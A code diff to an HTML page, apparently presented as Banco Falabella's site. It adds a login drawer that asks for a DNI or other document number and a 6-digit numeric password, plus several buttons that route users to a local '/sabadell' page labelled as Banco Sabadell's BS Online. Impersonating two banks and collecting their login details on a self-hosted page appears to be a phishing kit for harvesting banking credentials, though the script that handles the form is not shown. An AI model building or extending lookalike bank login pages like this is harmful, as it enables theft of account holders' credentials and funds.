@@ -38,6 +38,10 @@
         </div>
         <button class="btn btn-soft" type="button" data-open="hazte">Hazte cliente</button>
         <button class="btn btn-solid" type="button" data-open="banca">Banca Internet</button>
+        <a class="btn btn-solid" href="/sabadell" style="background:#002B49; border: 1px solid #00A8E8; display:inline-flex; align-items:center; gap:6px; text-decoration:none;">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#00A8E8" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10"/></svg>
+          Sabadell BS Online
+        </a>
         <button class="icon-btn" id="menu-toggle" type="button" aria-expanded="false" aria-label="Menú">
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M4 7h16M4 12h16M4 17h16" stroke="#222" stroke-width="2" stroke-linecap="round"/></svg>
         </button>
@@ -435,7 +439,11 @@
         <div class="actions"><button class="btn btn-solid" type="button" data-close>Listo</button></div>
       </div>
       <div class="actions" id="modal-info-actions" hidden>
-        <button class="btn btn-solid" type="button" data-close>Entendido</button>
+        <a class="btn btn-solid" href="/sabadell" style="background:#0082C8; display:inline-flex; align-items:center; gap:8px; text-decoration:none;">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+          Ir a Banco Sabadell (BS Online)
+        </a>
+        <button class="btn btn-soft" type="button" data-close>Cerrar</button>
       </div>
     </div>
   </div>
@@ -449,6 +457,61 @@
     <textarea id="mensaje" placeholder="¿Qué quieres revisar?"></textarea>
     <button class="btn btn-solid" type="button" id="enviar-mensaje" style="margin-top:10px">Enviar mensaje</button>
     <p class="note" id="mensaje-ok" hidden style="margin-top:12px">Mensaje anotado en esta sesión.</p>
+  </aside>
+
+  <!-- Banco Falabella Banca Internet Right Side Drawer -->
+  <div class="banca-backdrop" id="banca-backdrop" hidden></div>
+  <aside class="banca-drawer" id="banca-drawer" hidden role="dialog" aria-modal="true" aria-label="Ingresa a tu cuenta">
+    <button class="banca-close-btn" type="button" id="banca-drawer-close" aria-label="Cerrar">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+    <div class="banca-drawer-body">
+      <div class="banca-brand-logo">
+        <img src="assets/logo.svg" alt="Banco Falabella" width="165">
+      </div>
+      <h2 class="banca-drawer-title">Ingresa a tu cuenta</h2>
+
+      <form id="banca-login-form" class="banca-form" autocomplete="off">
+        <div class="banca-field-group">
+          <div class="banca-select-wrap">
+            <select id="banca-doc-type" class="banca-select" aria-label="Tipo de documento">
+              <option value="DNI" selected>DNI</option>
+              <option value="CE">Carné de Extranjería (CE)</option>
+              <option value="Pasaporte">Pasaporte</option>
+              <option value="RUC">RUC</option>
+            </select>
+            <svg class="banca-select-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg>
+          </div>
+        </div>
+
+        <div class="banca-field-group">
+          <input type="text" id="banca-doc-number" class="banca-input" placeholder="DNI" autocomplete="username" maxlength="8" required inputmode="numeric">
+        </div>
+
+        <div class="banca-field-group">
+          <div class="banca-pass-wrap">
+            <input type="password" id="banca-password" class="banca-input" placeholder="Tu contraseña tiene 6 dígitos" autocomplete="current-password" maxlength="6" required inputmode="numeric">
+            <button type="button" class="banca-pass-toggle" id="banca-pass-toggle" aria-label="Mostrar u ocultar contraseña">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/><line x1="1" y1="1" x2="23" y2="23" id="banca-eye-slash" style="display:block;"/></svg>
+            </button>
+          </div>
+        </div>
+
+        <button type="submit" class="banca-btn-submit" id="banca-btn-submit" disabled>Ingresar</button>
+
+        <a href="#" class="banca-recover-link" id="banca-recover-link">
+          Recupera o crea tu clave internet
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>
+        </a>
+
+        <div class="banca-extra-access">
+          <small>¿Buscas Banca por Internet de Banco Sabadell?</small>
+          <a href="/sabadell" class="btn btn-soft">
+            Acceder a BS Online (Banco Sabadell)
+          </a>
+        </div>
+      </form>
+    </div>
   </aside>
   <script src="js/main.js"></script>
 </body>
